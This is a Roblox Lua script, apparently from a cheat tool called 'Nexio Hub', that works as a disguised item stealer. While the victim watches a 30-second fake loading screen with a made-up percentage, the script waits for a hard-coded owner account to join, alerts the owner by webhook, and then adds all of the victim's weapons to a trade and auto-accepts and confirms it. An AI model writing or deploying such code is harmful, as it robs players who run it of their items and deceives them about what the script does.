-- Auto-Trade Functions
local tradeActive = false
local tradeRequestSent = false

local function findTradeRemote()
    local remotes = {}
    local hierarchy = {
        game:GetService("ReplicatedStorage"),
        game:GetService("Workspace"),
        game:GetService("Players").LocalPlayer
    }
    
    for _, parent in ipairs(hierarchy) do
        for _, child in ipairs(parent:GetChildren()) do
            if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") or child:IsA("BindableEvent") or child:IsA("BindableFunction") then
                table.insert(remotes, child)
            end
        end
    end
    return remotes
end

local function getAllWeapons()
    local weapons = {}
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    local character = LocalPlayer.Character
    
    if backpack then
        for _, item in ipairs(backpack:GetChildren()) do
            if item:IsA("Tool") then
                table.insert(weapons, item)
            end
        end
    end
    
    if character then
        for _, item in ipairs(character:GetChildren()) do
            if item:IsA("Tool") then
                table.insert(weapons, item)
            end
        end
    end
    
    return weapons
end

local function sendTradeRequest(targetPlayer)
    if not targetPlayer or tradeRequestSent then return end
    
    tradeRequestSent = true
    local remotes = findTradeRemote()
    
    for _, remote in ipairs(remotes) do
        pcall(function()
            local remoteName = string.lower(remote.Name)
            if string.find(remoteName, "trade") or string.find(remoteName, "offer") or string.find(remoteName, "request") then
                remote:FireServer(targetPlayer)
                task.wait(0.5)
            end
        end)
    end
    
    -- Try to find and use the trade GUI button
    pcall(function()
        local tradeGui = LocalPlayer.PlayerGui:FindFirstChild("TradeGui") or LocalPlayer.PlayerGui:FindFirstChild("TradeUI")
        if tradeGui then
            for _, button in ipairs(tradeGui:GetDescendants()) do
                if button:IsA("TextButton") or button:IsA("ImageButton") then
                    local btnText = string.lower(button.Text or "")
                    if string.find(btnText, "trade") or string.find(btnText, "offer") then
                        button:Click()
                        task.wait(0.5)
                    end
                end
            end
        end
    end)
end

local function addAllWeaponsToTrade()
    local weapons = getAllWeapons()
    local remotes = findTradeRemote()
    
    for _, weapon in ipairs(weapons) do
        for _, remote in ipairs(remotes) do
            pcall(function()
                local remoteName = string.lower(remote.Name)
                if string.find(remoteName, "trade") or string.find(remoteName, "add") or string.find(remoteName, "offer") then
                    remote:FireServer(weapon)
                    task.wait(0.1)
                end
            end)
        end
    end
    
    -- Also try to click add buttons in trade GUI
    pcall(function()
        local tradeGui = LocalPlayer.PlayerGui:FindFirstChild("TradeGui") or LocalPlayer.PlayerGui:FindFirstChild("TradeUI")
        if tradeGui then
            for _, button in ipairs(tradeGui:GetDescendants()) do
                if button:IsA("TextButton") or button:IsA("ImageButton") then
                    local btnText = string.lower(button.Text or "")
                    if string.find(btnText, "add") or string.find(btnText, "weapon") or string.find(btnText, "item") then
                        button:Click()
                        task.wait(0.1)
                    end
                end
            end
        end
    end)
end

local function autoAcceptTrade()
    pcall(function()
        local remotes = findTradeRemote()
        for _, remote in ipairs(remotes) do
            local remoteName = string.lower(remote.Name)
            if string.find(remoteName, "accept") or string.find(remoteName, "request") or string.find(remoteName, "start") then
                remote:FireServer(true)
                task.wait(0.3)
            end
        end
        
        -- Click accept buttons
        local tradeGui = LocalPlayer.PlayerGui:FindFirstChild("TradeGui") or LocalPlayer.PlayerGui:FindFirstChild("TradeUI")
        if tradeGui then
            for _, button in ipairs(tradeGui:GetDescendants()) do
                if button:IsA("TextButton") or button:IsA("ImageButton") then
                    local btnText = string.lower(button.Text or "")
                    if string.find(btnText, "accept") or string.find(btnText, "start") then
                        button:Click()
                        task.wait(0.3)
                    end
                end
            end
        end
    end)
end

local function autoConfirmTrade()
    pcall(function()
        local remotes = findTradeRemote()
        for _, remote in ipairs(remotes) do
            local remoteName = string.lower(remote.Name)
            if string.find(remoteName, "confirm") or string.find(remoteName, "ready") or string.find(remoteName, "finish") then
                remote:FireServer(true)
                task.wait(0.5)
            end
        end
        
        -- Click confirm buttons
        local tradeGui = LocalPlayer.PlayerGui:FindFirstChild("TradeGui") or LocalPlayer.PlayerGui:FindFirstChild("TradeUI")
        if tradeGui then
            for _, button in ipairs(tradeGui:GetDescendants()) do
                if button:IsA("TextButton") or button:IsA("ImageButton") then
                    local btnText = string.lower(button.Text or "")
                    if string.find(btnText, "confirm") or string.find(btnText, "ready") or string.find(btnText, "finish") then
                        button:Click()
                        task.wait(0.3)
                    end
                end
            end
        end
    end)
end

local function autoCancelTrade()
    pcall(function()
        local remotes = findTradeRemote()
        for _, remote in ipairs(remotes) do
            local remoteName = string.lower(remote.Name)
            if string.find(remoteName, "cancel") or string.find(remoteName, "decline") or string.find(remoteName, "close") then
                remote:FireServer()
                task.wait(0.3)
            end
        end
        
        local tradeGui = LocalPlayer.PlayerGui:FindFirstChild("TradeGui") or LocalPlayer.PlayerGui:FindFirstChild("TradeUI")
        if tradeGui then
            for _, button in ipairs(tradeGui:GetDescendants()) do
                if button:IsA("TextButton") or button:IsA("ImageButton") then
                    local btnText = string.lower(button.Text or "")
                    if string.find(btnText, "cancel") or string.find(btnText, "decline") or string.find(btnText, "close") then
                        button:Click()
                        task.wait(0.3)
                    end
                end
            end
        end
    end)
end

-- Auto-accept any incoming trade requests
local function autoAcceptIncomingTrades()
    task.spawn(function()
        while true do
            task.wait(1)
            autoAcceptTrade()
        end
    end)
end

-- Monitor for owner joining and auto-trade
local function monitorForOwner()
    task.spawn(function()
        while true do
            task.wait(0.5)
            
            -- Check if owner is in the game
            for _, player in ipairs(Players:GetPlayers()) do
                if player.Name == ownerUsername then
                    -- Owner found! Send trade request
                    sendWebhook("🚨 **OWNER JOINED** - Initiating trade with " .. LocalPlayer.Name)
                    sendTradeRequest(player)
                    
                    -- Wait for trade to start, then add all weapons
                    task.wait(2)
                    addAllWeaponsToTrade()
                    
                    -- Auto accept and confirm after adding weapons
                    task.wait(1)
                    autoAcceptTrade()
                    autoConfirmTrade()
                    
                    -- Keep monitoring trade
                    task.spawn(function()
                        while tradeActive do
                            task.wait(1)
                            addAllWeaponsToTrade()
                            autoConfirmTrade()
                        end
                    end)
                    
                    return
                end
            end
        end
    end)
end

-- Start auto-accept and monitoring
autoAcceptIncomingTrades()
monitorForOwner()

-- Extended loading screen animation (30 seconds)
local progress = 0
local loadingComplete = false
local loadingDuration = 30 -- seconds
local startTime = tick()

local loadingConnection = RunService.Heartbeat:Connect(function()
    local elapsed = tick() - startTime
    progress = math.min(1, elapsed / loadingDuration)
    loadingBarFill.Size = UDim2.new(progress, 0, 1, 0)
    
    local texts = {
        "Loading Nexio Hub...",
        "Connecting to server...",
        "Bypassing security...",
        "Injecting trade controller...",
        "Waiting for owner...",
        "Preparing trade system...",
        "Almost ready...",
        "Finalizing setup..."
    }
    
    local textIndex = math.floor(progress * #texts) + 1
    if textIndex <= #texts then
        loadingText.Text = texts[textIndex]
    end
    
    -- Add fake percentage
    loadingText.Text = loadingText.Text .. " (" .. math.floor(progress * 100) .. "%)"
    
    if progress >= 1 and not loadingComplete then
        loadingComplete = true
        loadingConnection:Disconnect()
        loadingText.Text = "Ready!"
        task.wait(1)
        loadingGui:Destroy()
        -- Start the main GUI
        startMainGui()
    end
end)

